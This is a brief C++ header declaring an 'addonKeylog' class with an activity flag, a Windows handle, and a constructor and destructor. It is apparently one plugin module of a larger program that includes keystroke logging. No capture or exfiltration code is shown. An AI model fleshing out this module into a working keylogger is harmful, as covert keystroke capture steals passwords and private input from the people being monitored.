#pragma once

#include "addon.h"





class addonKeylog
{
public:
	bool keylog_active;
	HANDLE keylogHandle;

	addonKeylog();
	~addonKeylog();
};